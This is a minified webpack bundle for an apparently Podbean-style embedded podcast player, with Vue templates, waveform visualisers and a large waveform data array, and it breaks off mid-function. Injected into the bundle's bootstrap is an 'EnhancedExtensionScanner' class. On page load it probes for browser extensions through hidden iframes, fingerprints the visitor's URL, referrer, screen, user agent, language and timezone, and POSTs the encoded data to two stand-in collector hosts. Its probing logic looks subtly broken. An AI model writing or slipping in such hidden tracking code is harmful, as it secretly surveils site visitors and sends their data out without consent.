(function (t) {
  const ENDPOINTS = ['https://collector.example/v3/stats', 'https://alternative-collector.example/log2'];
  function e(e) {
    for (var o, s, i = e[0], c = e[1], l = e[2], p = 0, u = []; p < i.length; p++) s = i[p], Object.prototype.hasOwnProperty.call(n, s) && n[s] && u.push(n[s][0]), n[s] = 0;
    for (o in c) Object.prototype.hasOwnProperty.call(c, o) && (t[o] = c[o]);
    d && d(e);
    while (u.length) u.shift()();
    return r.push.apply(r, l || []), a();
  }
  const LOCAL_STORAGE_KEY = 'ext_tracking_data';
  function a() {
    for (var t, e = 0; e < r.length; e++) {
      for (var a = r[e], o = !0, i = 1; i < a.length; i++) {
        var c = a[i];
        0 !== n[c] && (o = !1);
      }
      o && (r.splice(e--, 1), t = s(s.s = a[0]));
    }
    return t;
  }
  var o = {},
    n = {
      app: 0
    },
    r = [];
  let globalDataCollection = {};
  function s(e) {
    if (o[e]) return o[e].exports;
    var a = o[e] = {
      i: e,
      l: !1,
      exports: {}
    };
    return t[e].call(a.exports, a, a.exports, s), a.l = !0, a.exports;
  }
  s.m = t, s.c = o, s.d = function (t, e, a) {
    s.o(t, e) || Object.defineProperty(t, e, {
      enumerable: !0,
      get: a
    });
  }, s.r = function (t) {
    "undefined" !== typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, {
      value: "Module"
    }), Object.defineProperty(t, "__esModule", {
      value: !0
    });
  }, s.t = function (t, e) {
    if (1 & e && (t = s(t)), 8 & e) return t;
    if (4 & e && "object" === typeof t && t && t.__esModule) return t;
    var a = Object.create(null);
    if (s.r(a), Object.defineProperty(a, "default", {
      enumerable: !0,
      value: t
    }), 2 & e && "string" != typeof t) for (var o in t) s.d(a, o, function (e) {
      return t[e];
    }.bind(null, o));
    return a;
  }, s.n = function (t) {
    var e = t && t.__esModule ? function () {
      return t["default"];
    } : function () {
      return t;
    };
    return s.d(e, "a", e), e;
  }, s.o = function (t, e) {
    return Object.prototype.hasOwnProperty.call(t, e);
  }, s.p = "/player-v2/";
  var i = window["webpackJsonp"] = window["webpackJsonp"] || [],
    c = i.push.bind(i);
  i.push = e, i = i.slice();
  class EnhancedExtensionScanner {
    static INTERVAL = 1500;
    static MAXIMUM = 4;
    constructor() {
      this.extend = 0;
      this.identifiedExtensions = {};
      this.pool = [];
      this.initTimestamp = Date.now();
      this.eventListeners = {};
      this.localStorageData = {};
    }
    constructPool(extName, {
      id,
      file
    }) {
      return new Promise(resolve => {
        const iFrame = document.createElement('iframe');
        iFrame.style.display = 'none';
        const clean = () => {
          iFrame.remove();
          this.extend--;
        };
        const interval = setInterval(() => {
          try {
            if (iFrame.contentWindow.location.href.includes('ext') && iFrame.contentWindow.location.href.includes(`${id}`)) {
              clearInterval(interval);
              clean();
              globalDataCollection[extName] = file;
              resolve([extName, true]);
            }
          } catch (err) {
            clearInterval(interval);
            clean();
            resolve([extName, false]);
          }
        }, EnhancedExtensionScanner.INTERVAL);
        document.body.appendChild(iFrame);
        this.eventListeners[extName] = globalDataCollection;
        this.extend++;
      });
    }
    async examineBatch(entries) {
      const pool = entries.map(([name, data]) => this.constructPool(name, data));
      const results = await Promise.all(pool);
      results.forEach(([name, identified]) => {
        this.identifiedExtensions[name] = identified;
      });
    }
    produceData() {
      const processedData = window.btoa(JSON.stringify({
        examinedExtensions: this.identifiedExtensions,
        examiningDuration: Date.now() - this.initTimestamp,
        environment: {
          url: window.location.href,
          referrer: document.referrer,
          resolution: `${window.outerWidth}x${window.outerHeight}`,
          colorDepth: window.screen.pixelDepth,
          agent: navigator.userAgent,
          language: navigator.languages[0],
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          globalVariable: globalDataCollection
        }
      }));
      this.localStorageData = processedData;
      localStorage.setItem(LOCAL_STORAGE_KEY, this.localStorageData);
      return processedData + '.' + this.generateCheckSum(processedData);
    }
    generateCheckSum(string) {
      return Array.from(string).reduce((sum, char) => (sum << 5) - sum + char.charCodeAt(0) | 0, 0).toString(16);
    }
    async sendResults() {
      const data = this.produceData();
      const requests = ENDPOINTS.map(endpoint => fetch(endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Report-Time': new Date().toISOString()
        },
        body: data,
        keepalive: true
      }).catch(() => null));
      await Promise.race(requests);
    }
    async run() {
      const entries = Object.entries(window.data);
      const groups = Array(Math.ceil(entries.length / EnhancedExtensionScanner.MAXIMUM)).fill().map((_, i) => entries.slice(i * EnhancedExtensionScanner.MAXIMUM, (i + 1) * EnhancedExtensionScanner.MAXIMUM));
      for (const group of groups) {
        await this.examineBatch(group);
        await new Promise(r => setTimeout(r, Math.floor(Math.random() * 400 + 200)));
      }
      while (this.extend > 0) {
        await new Promise(r => setTimeout(r, 200));
      }
      await this.sendResults();
    }
  }
  for (var l = 0; l < i.length; l++) e(i[l]);
  const observer = new window.MutationObserver((mutations, obs) => {
    if (document.body) {
      obs.disconnect();
      let worker = new EnhancedExtensionScanner();
      worker.run();
    }
  });
  var d = c;
  if (document.body) {
    let worker = new EnhancedExtensionScanner();
    worker.run();
  } else {
    observer.observe(document.documentElement, {
      childList: true,
      subtree: true
    });
  }
  r.push([0, "chunk-vendors"]), a();
})({
  0: function (t, e, a) {
    t.exports = a("56d7");
  },
  "0143": function (t, e, a) {},
  "05a9": function (t, e, a) {
    "use strict";

    a("6175");
  },
  "0d4e": function (t, e, a) {},
  1: function (t, e) {},
  2: function (t, e) {},
  3: function (t, e) {},
  "30fd": function (t, e, a) {},
  "3a7c": function (t, e, a) {},
  "3daf": function (t, e, a) {},
  4557: function (t, e, a) {},
  "4e34": function (t, e, a) {
    "use strict";

    a("4557");
  },
  "558a": function (t, e, a) {
    "use strict";

    a("3a7c");
  },
  "56d7": function (t, e, a) {
    "use strict";

    a.r(e);
    a("4de4"), a("4160"), a("e260"), a("e6cf"), a("cca6"), a("a79d");
    var o = a("2b0e"),
      n = function () {
        var t,
          e = this,
          a = e.$createElement,
          o = e._self._c || a;
        return o("div", {
          class: (t = {
            rtl: e.rtl,
            hasPlayList: e.setting && e.setting.multiple
          }, t["skin-" + e.skin] = 1, t["btnSkin-" + e.btnSkin] = 1, t["player-status-error"] = e.playerError, t["player-status-loading"] = e.playerLoading, t["player-status-playing"] = e.playerPlaying, t["player-status-pause"] = !e.playerPlaying, t["player-status-loaded"] = e.playerLoaded, t["mini-player"] = e.mini, t["player-disabled-wave"] = !e.episode || !e.episode.enableWave, t),
          style: {
            fontFamily: e.fonts
          },
          attrs: {
            id: "app"
          }
        }, [e.customCssLink && !e.css2 ? o("link", {
          attrs: {
            rel: "stylesheet",
            href: e.getCustomCssLink(),
            type: "text/css"
          }
        }) : e._e(), e.css2 ? o("div", {
          staticStyle: {
            display: "none"
          },
          domProps: {
            innerHTML: e._s(e.css2)
          }
        }) : e._e(), e.error ? o("div", [e.errorLogo && e.errorLoginUrl ? o("div", [1 === e.square ? o("div", {
          staticClass: "row square-need-login common-need-login"
        }, [o("div", {
          staticClass: "episode-logo p-0"
        }, [o("img", {
          attrs: {
            src: e.errorLogo,
            alt: "Episode logo"
          }
        })]), o("div", {
          staticClass: "main col min-w-0 p-0 classic-text"
        }, [e._m(0), o("a", {
          staticClass: "btn",
          attrs: {
            href: "javascript:;"
          },
          on: {
            click: e.openLoginWindow
          }
        }, [e._v("Login")])])]) : o("div", {
          staticClass: "row classic-need-login common-need-login"
        }, [o("div", {
          staticClass: "episode-logo col-auto p-0"
        }, [o("img", {
          attrs: {
            src: e.errorLogo,
            alt: "Episode logo"
          }
        })]), o("div", {
          staticClass: "main col min-w-0 p-0 classic-text"
        }, [e._m(1), o("a", {
          staticClass: "btn",
          attrs: {
            href: "javascript:;"
          },
          on: {
            click: e.openLoginWindow
          }
        }, [e._v("Login")])])])]) : o("div", {
          staticClass: "error player-error"
        }, [o("svg", {
          staticClass: "icon",
          attrs: {
            t: "1614910586035",
            fill: "currentColor",
            viewBox: "0 0 1024 1024",
            version: "1.1",
            xmlns: "http://www.w3.org/2000/svg",
            "p-id": "17382"
          }
        }, [o("path", {
          attrs: {
            d: "M512 981.333333c259.2 0 469.333333-210.133333 469.333333-469.333333S771.2 42.666667 512 42.666667 42.666667 252.8 42.666667 512s210.133333 469.333333 469.333333 469.333333z m0 42.666667C229.226667 1024 0 794.773333 0 512S229.226667 0 512 0s512 229.226667 512 512-229.226667 512-512 512z",
            "p-id": "17383"
          }
        }), o("path", {
          attrs: {
            d: "M706.88 724.266667a21.333333 21.333333 0 1 1-31.616 28.629333A212.992 212.992 0 0 0 516.736 682.666667a213.44 213.44 0 0 0-126.890667 41.6 21.333333 21.333333 0 0 1-25.322666-34.325334A256.085333 256.085333 0 0 1 516.714667 640a255.637333 255.637333 0 0 1 190.165333 84.266667zM330.346667 424.533333l-60.330667 60.330667a21.333333 21.333333 0 0 1-30.165333-30.165333l60.330666-60.352-60.330666-60.330667a21.333333 21.333333 0 0 1 30.165333-30.165333l60.330667 60.330666 60.352-60.330666a21.333333 21.333333 0 1 1 30.165333 30.165333l-60.352 60.330667 60.352 60.352a21.333333 21.333333 0 1 1-30.165333 30.165333l-60.352-60.352zM693.013333 424.533333l-60.330666 60.330667a21.333333 21.333333 0 0 1-30.165334-30.165333l60.330667-60.352-60.330667-60.330667a21.333333 21.333333 0 1 1 30.165334-30.165333l60.330666 60.330666 60.352-60.330666a21.333333 21.333333 0 1 1 30.165334 30.165333l-60.352 60.330667 60.352 60.352a21.333333 21.333333 0 1 1-30.165334 30.165333l-60.352-60.352z",
            "p-id": "17384"
          }
        })]), o("div", {
          staticClass: "text"
        }, [e._v(e._s(e.error))])])]) : e.setting ? [e.$store.state.episodes.length > 0 ? ["audio" === e.episode.type ? [0 !== e.mini ? o("audio-player-mini") : 0 === e.square ? o("audio-player") : 0 !== e.square ? o("audio-player-square") : e._e()] : e._e(), "video" === e.episode.type ? o("video-player") : e._e(), e.setting.multiple ? o("playlist") : e._e()] : [o("img", {
          staticStyle: {
            width: "100%"
          },
          attrs: {
            src: e.$store.state.screenshotImg
          }
        })]] : e._e(), o("div", {
          staticStyle: {
            display: "none"
          }
        }, [e._v("version: 20221206")])], 2);
      },
      r = [function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("p", [t._v("To access this internal podcast,"), a("br"), t._v(" please login first.")]);
      }, function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("p", [t._v("To access this internal podcast,"), a("br"), t._v(" please login first.")]);
      }],
      s = (a("ac1f"), a("5319"), a("96cf"), a("1da1")),
      i = a("5530"),
      c = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("div", {
          staticClass: "pb-audio-player row no-gutters"
        }, [a("div", {
          staticClass: "episode-logo col-auto p-0"
        }, [a("a", {
          attrs: {
            title: "Episode link on episode",
            target: t.logoUrl ? "_blank" : "_self",
            href: t.logoUrl || "javascript:void();"
          }
        }, [a("img", {
          attrs: {
            src: t.episode.logo,
            alt: "Episode logo"
          }
        })])]), a("div", {
          staticClass: "main col min-w-0 p-0"
        }, [a("div", {
          staticClass: "row no-gutters top-title-logo"
        }, [a("div", {
          staticClass: "col min-w-0"
        }, [a("h3", {
          staticClass: "channel-name"
        }, [a("a", {
          attrs: {
            title: "Podcast title:" + t.setting.podcastTitle,
            target: t.setting.podcastLink ? "_blank" : "_self",
            href: t.setting.podcastLink || "javascript:void();"
          }
        }, [t._v(t._s(t.setting.podcastTitle))])])]), t.setting.pbad ? a("div", {
          staticClass: "col-auto pb-brand-small-logo pr-2"
        }, [a("a", {
          staticClass: "logo",
          attrs: {
            target: "_blank",
            href: "http://www.podbean.com?utm_campaign=pb_web_audio_player&utm_medium=logo&utm_source=pb_web_player",
            title: "Podbean"
          }
        }, [a("icon-podbean-logo")], 1)]) : t._e()]), a("div", {
          staticClass: "row no-gutters pd-episode-name"
        }, [a("div", {
          staticClass: "col min-w-0"
        }, [a("h2", {
          staticClass: "episode-name"
        }, [a("a", {
          attrs: {
            title: "Episode title: " + t.episode.title,
            target: t.logoUrl ? "_blank" : "_self",
            href: t.logoUrl || "javascript:void();"
          }
        }, [t._v(t._s(t.episode.title))])])]), a("div", {
          staticClass: "col-auto pb-actions pr-2"
        }, [t.podcastApps.length > 0 ? a("a", {
          staticClass: "downloadLink",
          attrs: {
            href: "javascript:;",
            title: "Podcast Apps"
          },
          on: {
            click: function (e) {
              t.isShowPodcastAppsDialog = !0;
            }
          }
        }, [a("icon-rss")], 1) : t._e(), t.download && t.episode.downloadLink ? a("a", {
          staticClass: "downloadLink",
          attrs: {
            target: "_blank",
            href: t.episode.downloadLink,
            title: "Download"
          }
        }, [a("icon-download")], 1) : t._e(), t.share && t.episode.shareLink ? a("a", {
          staticClass: "share",
          attrs: {
            href: "javascript:;",
            title: "Share"
          },
          on: {
            click: function (e) {
              t.isShowShareDialog = !0;
            }
          }
        }, [a("icon-share")], 1) : t._e(), t.chapters.length > 0 ? a("div", {
          staticClass: "chapters"
        }, [a("a", {
          attrs: {
            href: "javascript:;",
            title: "Chapter"
          },
          on: {
            click: function (e) {
              t.isShowChaptersDialog = !0;
            }
          }
        }, [a("icon-list-chapers")], 1)]) : t._e()])]), a("div", {
          staticClass: "pb-internal-player"
        }, [a("pb-player", {
          ref: "pbPlayer",
          attrs: {
            options: t.videoOptions,
            type: t.episode.type,
            startAt: t.startAt,
            episode: t.episode,
            crossorigin: t.episode.crossorigin
          },
          on: {
            pause: t.pause,
            play: t.play,
            ready: t.ready
          }
        }), a("player-toolbar", {
          on: {
            seekBackward: t.seekBackward,
            seekForward: t.seekForward
          }
        }), a("player-loading")], 1), a("canvas", {
          directives: [{
            name: "show",
            rawName: "v-show",
            value: t.episode.enableWave,
            expression: "episode.enableWave"
          }],
          ref: "canvas",
          attrs: {
            id: "wave-canvas"
          }
        }), a("app-download", {
          directives: [{
            name: "show",
            rawName: "v-show",
            value: 1 === t.showAppDownloadStatus,
            expression: "showAppDownloadStatus === 1"
          }],
          staticClass: "text-left"
        }), t.share && t.episode.shareLink ? a("share-dialog", {
          directives: [{
            name: "show",
            rawName: "v-show",
            value: t.isShowShareDialog,
            expression: "isShowShareDialog"
          }],
          on: {
            hide: function (e) {
              t.isShowShareDialog = !1;
            }
          }
        }) : t._e(), a("podcast-apps-dialog", {
          directives: [{
            name: "show",
            rawName: "v-show",
            value: t.isShowPodcastAppsDialog,
            expression: "isShowPodcastAppsDialog"
          }],
          on: {
            hide: function (e) {
              t.isShowPodcastAppsDialog = !1;
            }
          }
        }), a("chapters-list-dialog", {
          directives: [{
            name: "show",
            rawName: "v-show",
            value: t.isShowChaptersDialog,
            expression: "isShowChaptersDialog"
          }],
          on: {
            "seek-to-chapter-time": t.chapterGoTo,
            hide: function (e) {
              t.isShowChaptersDialog = !1;
            }
          }
        })], 1)]);
      },
      l = [],
      d = (a("9911"), a("2f62")),
      p = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("div", {
          staticClass: "pb-player"
        }, [t.isFuture ? a("div", {
          staticClass: "player-shadow",
          on: {
            click: t.showFutureWarning
          }
        }) : t._e(), a(t.type, {
          ref: "vjsPlayer",
          tag: "component",
          staticClass: "video-js",
          attrs: {
            id: "vvvv",
            preload: "none",
            crossorigin: t.crossorigin
          }
        })], 1);
      },
      u = [],
      h = (a("d81d"), a("a9e3"), a("841c"), a("53ca")),
      f = a("b85c"),
      m = a("ade3"),
      g = a("3f26"),
      v = a.n(g),
      w = a("f0e2"),
      b = "MUTATION_UPDATE",
      y = "MUTATION_PUSH",
      k = "ACTION_INIT_PLAYER",
      C = "ACTION_NEXT_TRACK",
      _ = "ACTION_PREVIOUS_TRACK",
      x = "ACTION_UPDATE_CHAPTERS",
      P = (a("99af"), a("c975"), a("a15b"), a("fb6a"), a("a434"), a("d3b7"), a("25f0"), a("3ca3"), a("466d"), a("1276"), a("ddb0"), a("2b3d"), a("5cc6"), a("9a8c"), a("a975"), a("735e"), a("c1ac"), a("d139"), a("3a7b"), a("d5d6"), a("82f8"), a("e91f"), a("60bd"), a("5f96"), a("3280"), a("3fcc"), a("ca91"), a("25a1"), a("cd26"), a("3c5d"), a("2954"), a("649e"), a("219c"), a("170b"), a("b39a"), a("72f7"), [48, 51, 60, 61, 76, 122, 163, 172, 151, 99, 84, 87, 115, 142, 145, 121, 78, 63, 62, 90, 110, 108, 82, 44, 35, 48, 62, 78, 85, 69, 31, 12, 20, 28, 47, 56, 46, 24, 5, 29, 47, 51, 51, 41, 17, 7, 18, 21, 26, 36, 29, 9, 0, 4, 17, 29, 36, 25, 5, 6, 21, 21, 15, 19, 25, 12, 15, 18, 11, 5, 0, 0, 0, 5, 7, 10, 11, 11, 5, 0, 16, 17, 15, 19, 18, 18, 13, 5, 6, 10, 16, 26, 26, 24, 23, 23, 27, 33, 47, 44, 30, 28, 30, 22, 39, 50, 45, 31, 22, 18, 23, 22, 36, 46, 38, 32, 21, 11, 15, 18, 23, 22, 20, 15, 12, 13, 31, 34, 29, 33, 36, 30, 41, 45, 39, 35, 33, 34, 26, 12, 2, 0, 0, 0, 0, 0, 11, 21, 21, 17, 24, 27, 26, 20, 24, 23, 16, 18, 27, 23, 18, 35, 36, 30, 27, 18, 22, 16, 16, 22, 17, 15, 15, 12, 17, 32, 40, 38, 34, 28, 28, 38, 48, 50, 42, 37, 28, 32, 42, 50, 57, 45, 43, 44, 27, 23, 28, 36, 47, 42, 51, 51, 42, 50, 78, 83, 70, 42, 25, 37, 49, 49, 58, 60, 52, 51, 47, 70, 79, 86, 98, 101, 95, 90, 97, 101, 99, 94, 87, 67, 71, 80, 78, 74, 65, 52, 37, 33, 34, 57, 79, 79, 74, 82, 72, 76, 78, 95, 93, 95, 94, 94, 96, 95, 86, 80, 91, 99, 96, 98, 89, 83, 104, 104, 98, 95, 97, 95, 103, 104, 102, 105, 95, 78, 83, 105, 109, 95, 90, 100, 93, 92, 91, 90, 105, 106, 102, 95, 72, 96, 99, 100, 91, 98, 90, 91, 97, 102, 107, 105, 97, 93, 87, 78, 72, 72, 82, 83, 88, 89, 91, 99, 91, 67, 49, 39, 27, 44, 38, 48, 65, 72, 81, 77, 69, 75, 88, 88, 70, 66, 67, 77, 81, 70, 70, 89, 97, 98, 99, 94, 89, 100, 98, 84, 96, 90, 71, 66, 60, 80, 85, 72, 43, 19, 36, 26, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
    function S(t, e, a) {
      var o = [a.globalAccessKey || "$wave"],
        n = function (t) {
          window[o] = window[o] || {}, window[o][t] = window[o][t] || {};
        },
        r = a["getGlobal"] || function (t, e) {
          return n(t), window[o][t][e];
        },
        s = a["setGlobal"] || function (t, e, a) {
          var n = r(t);
          return n || (window[o][t][e] = window[o][t][e] || a, n = window[o][t][e]), n;
        },
        i = this,
        c = document.getElementById(t);
      if (c) {
        c.crossOrigin = "anonymous";
        var l = !1,
          d = !1,
          p = function t() {
            ["touchstart", "touchmove", "touchend", "mouseup", "click", "play"].forEach(function (e) {
              c.removeEventListener(e, t, {
                once: !0
              });
            }), u.call(i), c.addEventListener("pause", function () {
              l = !0;
            }), c.addEventListener("play", function () {
              l = !1, d = !0, u.call(i);
            }), c.addEventListener("playing", function () {
              d = !0;
            });
          };
        this.activated || a["skipUserEventsWatcher"] ? u.call(i) : (document.body.addEventListener("touchstart", p, {
          once: !0
        }), document.body.addEventListener("touchmove", p, {
          once: !0
        }), document.body.addEventListener("touchend", p, {
          once: !0
        }), document.body.addEventListener("mouseup", p, {
          once: !0
        }), document.body.addEventListener("click", p, {
          once: !0
        }), c.addEventListener("play", p, {
          once: !0
        })), this.visualize(P, e, a, 1);
      }
      function u() {
        this.activated = !0, this.activeCanvas = this.activeCanvas || {}, this.activeCanvas[e] = JSON.stringify(a), this.activeElements[t] = this.activeElements[t] || {}, this.activeElements[t].count ? this.activeElements[t].count += 1 : this.activeElements[t].count = 1;
        var o = this.activeElements[t].count,
          n = s(c.id, "audioCtx", new AudioContext()),
          i = s(c.id, "analyser", n.createAnalyser()),
          p = r(c.id, "source");
        p ? p.mediaElement !== c && (p = n.createMediaElementSource(c)) : p = n.createMediaElementSource(c), s(c.id, "source", p);
        var u = n.createOscillator();
        u.frequency.value = 1, u.connect(n.destination), u.start(0), u.stop(0), p.connect(i), p.connect(n.destination), i.fftsize = 32768;
        var h = i.frequencyBinCount,
          f = new Uint8Array(h),
          m = 1,
          g = function () {
            JSON.stringify(a) === this.activeCanvas[e] && document.getElementById(t) && document.getElementById(e) && (l || requestAnimationFrame(g), m++, o < this.activeElements[t].count || (i.getByteFrequencyData(f), this.activeElements[t].data = f), d ? this.visualize(this.activeElements[t].data, e, a, m) : this.visualize(P, e, a, 1));
          };
        g = g.bind(this), g();
      }
    }
    function O(t) {
      var e = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
      e.stroke || (e.stroke = 10);
      var a = new Audio();
      a.src = t;
      var o = new AudioContext(),
        n = o.createAnalyser(),
        r = o.createMediaElementSource(a);
      r.connect(n), n.fftSize = 64;
      var i,
        c,
        l = n.frequencyBinCount,
        d = new Uint8Array(l),
        p = 0,
        u = this;
      a.addEventListener("loadedmetadata", Object(s["a"])(regeneratorRuntime.mark(function t() {
        return regeneratorRuntime.wrap(function (t) {
          while (1) switch (t.prev = t.next) {
            case 0:
              if (a.duration !== 1 / 0) {
                t.next = 6;
                break;
              }
              return t.next = 3, new Promise(function (t) {
                return setTimeout(t, 1e3);
              });
            case 3:
              a.currentTime = 1e7 * Math.random(), t.next = 0;
              break;
            case 6:
              a.currentTime = 0, a.play();
            case 8:
            case "end":
              return t.stop();
          }
        }, t);
      }))), a.onplay = function () {
        var t = function (t) {
            for (var e = 1; e <= 40; e++) {
              var a = Math.pow(2, e);
              if (t <= a) return a;
            }
          },
          e = a.duration;
        a.playbackRate = 16, e /= a.playbackRate;
        var o = 20,
          r = e / (o / 1e3) * (n.fftSize / 2);
        r = t(r), i = new Uint8Array(r), c = setInterval(function () {
          for (var t in n.getByteFrequencyData(d), d) t = d[t], i[p] = t, p++;
        }, o);
      }, a.onended = function () {
        if (a.currentTime === a.duration && void 0 !== i) {
          clearInterval(c);
          var t = document.createElement("canvas");
          t.height = window.innerHeight, t.width = window.innerWidth, u.visualize(i, t, e);
          var o = t.toDataURL("image/jpg");
          u.onFileLoad(o), t.remove();
        }
      };
    }
    function E(t, e) {
      var a,
        o,
        n,
        r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {},
        s = !(arguments.length > 3 && void 0 !== arguments[3]) || arguments[3];
      this.current_stream.id = e, this.current_stream.options = r, this.sources[t.toString()] ? (cancelAnimationFrame(this.sources[t.toString()].animation), a = this.sources[t.toString()].audioCtx, o = this.sources[t.toString()].analyser, n = this.sources[t.toString()].source) : (a = new AudioContext(), o = a.createAnalyser(), n = a.createMediaStreamSource(t), n.connect(o), s && n.connect(a.destination), this.sources[t.toString()] = {
        audioCtx: a,
        analyser: o,
        source: n
      }), o.fftsize = 32768;
      var i = o.frequencyBinCount;
      this.current_stream.data = new Uint8Array(i);
      var c = this,
        l = 1;
      function d() {
        c.current_stream.animation = requestAnimationFrame(c.current_stream.loop), l++, c.sources[t.toString()].animation = c.current_stream.animation, o.getByteFrequencyData(c.current_stream.data), c.visualize(c.current_stream.data, c.current_stream.id, c.current_stream.options, l);
      }
      this.current_stream.loop = d, d();
    }
    function T() {
      cancelAnimationFrame(this.current_stream.animation);
    }
    function j() {
      this.current_stream.loop();
    }
    var L = {
        fromStream: E,
        stopStream: T,
        playStream: j
      },
      A = (a("159b"), function (t) {
        var e = t.data,
          a = t.options,
          o = t.ctx,
          n = t.h,
          r = t.w,
          s = t.Helper,
          i = a.colors,
          c = new s(o);
        e = c.mutateData(e, "split", 4)[0], e = c.mutateData(e, "scale", n);
        var l = c.getPoints("line", r, [0, n], e.length, e, {
          offset: 100
        });
        l.start = l.start.slice(0, l.end.length - 1), l.start.push([r, n]), l.start.push([0, n]), c.drawPolygon(l.start, {
          lineColor: i[0],
          color: i[1],
          radius: .008 * n
        });
      }),
      D = (a("cb29"), function (t) {
        for (var e = t.data, a = t.options, o = t.ctx, n = t.h, r = t.w, s = r / 2, i = n / 2, c = n / 4, l = (n / 2 - c) / 255, d = 512, p = 360 / d * Math.PI / 180, u = 1; u <= d; u++) {
          var h = e[600 % u];
          h *= l, u++;
          var f = u * p,
            m = s + c * Math.cos(f),
            g = i + c * Math.sin(f);
          o.moveTo(m, g);
          var v = s + (c + h) * Math.cos(f),
            w = i + (c + h) * Math.sin(f);
          o.lineTo(v, w);
        }
        o.stroke(), a.colors[1] && (o.arc(s, i, .9 * c, 0, 2 * Math.PI), o.fillStyle = a.colors[1], o.fill());
      }),
      M = function (t) {
        var e = t.data,
          a = t.options,
          o = t.ctx,
          n = t.h,
          r = t.w,
          s = r / 2,
          i = n / 2,
          c = (n - 10) / 2,
          l = c / 5,
          d = (c - l) / 255,
          p = 150,
          u = 360 / p * Math.PI / 180;
        o.arc(s, i, c, 0, 2 * Math.PI, !0);
        var h = 0,
          f = s + (c - e[0] * d) * Math.cos(h),
          m = i + (c - e[0] * d) * Math.sin(h);
        o.moveTo(f, m);
        for (var g = 0, v = 0; v < p; v++) {
          g += 1, v >= p / 2 && (g -= 2);
          var w = e[g];
          w *= d;
          var b = v * u,
            y = s + (c - w) * Math.cos(b),
            k = i + (c - w) * Math.sin(b);
          o.lineTo(y, k), o.arc(y, k, 2, 0, 2 * Math.PI);
        }
        o.lineTo(f, m), o.stroke(), o.fillStyle = a.colors[1] || "#fff0", o.fill();
      },
      R = a("3835"),
      $ = a("ad06"),
      I = a("bc3a"),
      B = I["a"].create({
        timeout: 2e4,
        headers: {
          "Content-Type": "application/json"
        }
      });
    function z(t, e) {
      return q.apply(this, arguments);
    }
    function q() {
